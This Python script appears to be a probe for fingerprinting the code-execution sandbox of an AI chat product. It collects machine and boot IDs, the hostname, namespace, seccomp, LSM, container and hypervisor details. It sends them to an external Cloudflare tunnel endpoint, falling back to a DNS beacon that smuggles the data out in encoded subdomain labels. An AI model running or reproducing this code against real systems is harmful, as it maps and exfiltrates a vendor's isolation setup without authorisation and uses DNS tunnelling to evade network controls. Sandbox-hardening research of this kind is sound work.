import base64
import hashlib
import json
import os
import platform
import socket
import subprocess
import sys
import threading
import time
import urllib.error
import urllib.request

NONCE = "45952b9f21bd549bf023ae03291fe2cf"
ENDPOINT = "https://david-charged-dem-currently.trycloudflare.com/ingest"
VENDOR = "doubao"
MODE = "chat"
CONFIG = "fast"
RUN_ID = "doubao-chat-fast-45952b9f"
DNS_DOMAIN = "probe.example.org"
STAGE = "turn"

POST_TIMEOUT = 4
DNS_TIMEOUT = 2
HEARTBEAT_SECONDS = 5
MAX_READ_BYTES = 65536


def sha256_hex(data):
    return hashlib.sha256(data).hexdigest()


def sha256_short(data):
    return sha256_hex(data)[:16]


def self_hash():
    if not hasattr(self_hash, "v"):
        self_hash.v = sha256_hex(open(__file__, "rb").read())
    return self_hash.v


def now_iso():
    return time.strftime("%Y-%m-%dT%H:%M:%S%z")


def read_bytes(path, limit=MAX_READ_BYTES):
    try:
        with open(path, "rb") as f:
            return f.read(limit)
    except Exception:
        return None


def read_text(path, limit=MAX_READ_BYTES):
    b = read_bytes(path, limit)
    if b is None:
        return None
    return b.decode("utf-8", "replace")


def run_bytes(cmd, timeout=5):
    try:
        p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        out, err = p.communicate(timeout=timeout)
        return p.returncode, out or b"", err or b""
    except Exception as e:
        return -1, b"", repr(e).encode("utf-8", "replace")


def run_text(cmd, timeout=5):
    rc, out, err = run_bytes(cmd, timeout)
    return rc, out.decode("utf-8", "replace"), err.decode("utf-8", "replace")


def boot_id():
    v = read_text("/proc/sys/kernel/random/boot_id")
    return (v or "").strip()


def machine_id():
    v = read_text("/etc/machine-id")
    if not v:
        v = read_text("/var/lib/dbus/machine-id")
    return (v or "").strip()


def hostname():
    return platform.node()


def instance_fp():
    if not hasattr(instance_fp, "v"):
        instance_fp.v = "|".join([boot_id(), machine_id(), hostname()])
    return instance_fp.v


def make_record(dim, subitem, value, fingerprint="", anchor="A", channel="L1"):
    return {
        "run_id": RUN_ID,
        "vendor": VENDOR,
        "mode": MODE,
        "config": CONFIG,
        "dim": dim,
        "subitem": subitem,
        "value": value,
        "fingerprint": fingerprint,
        "ts": now_iso(),
        "instance_fp": instance_fp(),
        "anchor": anchor,
        "probe_sha": self_hash(),
        "channel": channel,
    }


def post_json(url, payload, timeout=POST_TIMEOUT):
    data = json.dumps(payload, ensure_ascii=False).encode("utf-8")
    req = urllib.request.Request(url, data=data, method="POST")
    req.add_header("Content-Type", "application/json")
    req.add_header("User-Agent", "probe-channel/1")
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return True, resp.status
    except Exception as e:
        return False, repr(e)


def post_envelope(records):
    payload = {"nonce": NONCE, "self_hash": self_hash(), "records": records}
    return post_json(ENDPOINT, payload)


def dns_query(host, timeout=DNS_TIMEOUT):
    result = {"host": host, "ok": False, "detail": ""}

    def worker():
        try:
            socket.getaddrinfo(host, None)
            result["ok"] = True
        except Exception as e:
            result["detail"] = repr(e)

    t = threading.Thread(target=worker, daemon=True)
    t.start()
    t.join(timeout)
    if t.is_alive():
        result["detail"] = "timeout"
    return result


def b32_short(s):
    return base64.b32encode(s.encode("utf-8")).decode("ascii").rstrip("=").lower()[:48]


def dns_beacon(records):
    parts = [RUN_ID, self_hash()[:16], NONCE[:16]]
    for r in records:
        parts.append("%s.%s" % (r["dim"][:6], r["subitem"][:6]))
        if r.get("value"):
            parts.append(b32_short(str(r["value"])[:24]))
    host = ".".join(parts) + "." + DNS_DOMAIN
    return dns_query(host)


def post_with_dns_fallback(records):
    ok, detail = post_envelope(records)
    if ok:
        return {"channel": "L1", "ok": True, "detail": "", "dns": None}
    return {"channel": "L2", "ok": False, "detail": detail, "dns": dns_beacon(records)}

def collect_isolation():
    records = []
    ns = {}
    for name in ["mnt", "pid", "net", "user", "uts", "ipc", "cgroup"]:
        p = "/proc/self/ns/%s" % name
        try:
            ns[name] = os.readlink(p)
        except Exception as e:
            ns[name] = "err(%s)" % type(e).__name__
    records.append(make_record("Isolation", "namespace", json.dumps(ns, ensure_ascii=False)))

    seccomp_val = "?"
    st = read_text("/proc/self/status")
    if st:
        for line in st.splitlines():
            if line.startswith("Seccomp:"):
                seccomp_val = line.split(":", 1)[1].strip()
    records.append(make_record("Isolation", "seccomp", "Seccomp=%s" % seccomp_val))

    lsm = {}
    aa = read_text("/proc/self/attr/current")
    lsm["apparmor"] = aa.strip() if aa is not None else "unavailable"
    se = read_text("/sys/fs/selinux/enforce")
    lsm["selinux_enforce"] = se.strip() if se is not None else "unavailable"
    records.append(make_record("Isolation", "LSM", json.dumps(lsm, ensure_ascii=False)))

    cg = read_text("/proc/1/cgroup")
    container = {
        "dockerenv": os.path.exists("/.dockerenv"),
        "containerenv": os.path.exists("/run/.containerenv"),
        "cgroup": (cg or "").strip(),
    }
    records.append(make_record("Isolation", "容器", json.dumps(container, ensure_ascii=False)))

    rc, out, err = run_text(["systemd-detect-virt"], timeout=5)
    virt = out.strip() if rc == 0 else "rc=%s" % rc
    hypervisor = "?"
    cpuinfo = read_text("/proc/cpuinfo") or ""
    for line in cpuinfo.splitlines():
        if line.lower().startswith("hypervisor"):
            hypervisor = line.split(":", 1)[1].strip() if ":" in line else line
    hv = read_text("/sys/hypervisor/type")
    hv_type = hv.strip() if hv is not None else ""
    records.append(make_record("Isolation", "微虚拟机", "detect_virt=%s hypervisor_flag=%s hv_type=%s" % (virt, hypervisor, hv_type)))
    return records


if __name__ == "__main__":
    post_with_dns_fallback(collect_isolation())
